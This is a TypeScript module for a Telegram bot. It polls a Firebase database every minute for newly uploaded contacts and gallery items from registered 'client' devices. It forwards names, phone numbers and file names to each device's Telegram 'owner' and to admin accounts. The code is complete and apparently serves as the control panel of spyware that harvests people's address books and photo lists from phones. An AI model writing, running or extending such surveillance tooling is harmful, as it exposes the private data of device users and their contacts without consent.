import { Telegraf } from "telegraf";
import { logger } from "../lib/logger";
import { ADMIN_TG_IDS } from "../lib/admin";
import { fbGet, fbUpdate } from "./firebase";

// ── Pure helpers (unit-tested in fetchWatcher.test.ts) ──────────────────
export function diffKeys(known: Set<string>, obj: unknown): string[] {
  if (!obj || typeof obj !== "object") return [];
  return Object.keys(obj).filter((k) => !known.has(k));
}
export function tagLine(
  kind: "contacts" | "gallery",
  model: string,
  id: string
): string {
  const m =
    String(model || "unknown").replace(/[^A-Za-z0-9]/g, "").slice(0, 24) ||
    "unknown";
  return `#fetch-${kind} #${m} #dev-${String(id).slice(0, 8)}`;
}
export function summarizeContact(c: any): string {
  if (!c || typeof c !== "object") return "contact";
  const name = c.name || c.displayName || c.title || "?";
  const num = c.number || c.phone || c.mobile || "?";
  return `${String(name).slice(0, 40)} (${String(num).slice(0, 20)})`;
}
export function summarizeGalleryItem(key: string, g: any): string {
  if (typeof g === "string") return g.slice(0, 80);
  if (g && typeof g === "object") {
    return String(g.name || g.fileName || g.url || g.uri || key).slice(0, 80);
  }
  return String(key);
}

// ── Watcher state ───────────────────────────────────────────────────────
const seen: Map<string, Set<string>> = new Map();

async function sendToAll(
  bot: Telegraf,
  text: string,
  ownerId: string | null
): Promise<void> {
  const targets = new Set<string>();
  if (ownerId) targets.add(ownerId);
  for (const a of ADMIN_TG_IDS) targets.add(a);
  for (const chat of targets) {
    try {
      await bot.telegram.sendMessage(chat, text, { parse_mode: "Markdown" });
    } catch (err) {
      logger.error({ err, chat }, "fetchWatcher send failed");
    }
  }
}

async function audit(
  action: string,
  deviceId: string,
  tags: string,
  extra: Record<string, unknown>
): Promise<void> {
  try {
    await fbUpdate(`auditLogs/fetch-${Date.now()}`, {
      ts: Date.now(),
      actor: "fetch-watcher",
      action,
      deviceId,
      tags,
      ...extra,
    });
  } catch (err) {
    logger.error({ err }, "fetchWatcher audit write failed");
  }
}

async function scanKind(
  bot: Telegraf,
  kind: "contacts" | "gallery"
): Promise<void> {
  const clients = (await fbGet("clients")) || {};
  for (const [id, rec] of Object.entries<any>(clients)) {
    if (!rec || typeof rec !== "object") continue;
    if (!(kind in rec)) continue;
    const key = `${id}:${kind}`;
    let node: any = null;
    try {
      node = await fbGet(`clients/${id}/${kind}`);
    } catch {
      node = null;
    }
    const fresh = diffKeys(seen.get(key) || new Set<string>(), node).slice(0, 5);
    if (!seen.has(key)) {
      seen.set(
        key,
        new Set(
          node && typeof node === "object" ? Object.keys(node) : []
        )
      );
      continue; // seed silently on first sight
    }
    const known = seen.get(key)!;
    for (const k of fresh) known.add(k);
    if (!fresh.length) continue;
    const model = rec.modelName || rec.model || "unknown";
    const owner =
      rec.ownerTelegramId && /^\d{3,20}$/.test(String(rec.ownerTelegramId))
        ? String(rec.ownerTelegramId)
        : null;
    const tags = tagLine(kind, model, id);
    let preview = "";
    if (kind === "contacts") {
      preview = fresh.map((k) => summarizeContact(node[k])).join("\n• ");
    } else {
      preview = fresh.map((k) => summarizeGalleryItem(k, node[k])).join("\n• ");
    }
    const text =
      `📥 *New ${kind} upload*\n${tags}\n\n• ${preview}\n\n` +
      `🆔 \`${id}\` (+${fresh.length} item${fresh.length > 1 ? "s" : ""})`;
    await sendToAll(bot, text, owner);
    await audit("forward-" + kind, id, tags, { count: fresh.length });
  }
}

export function startFetchWatcher(bot: Telegraf): void {
  const tick = async () => {
    try {
      await scanKind(bot, "contacts");
      await scanKind(bot, "gallery");
    } catch (err) {
      logger.error({ err }, "fetchWatcher cycle failed");
    }
  };
  const t = setInterval(tick, 60000);
  if (typeof (t as any).unref === "function") (t as any).unref();
  tick();
}
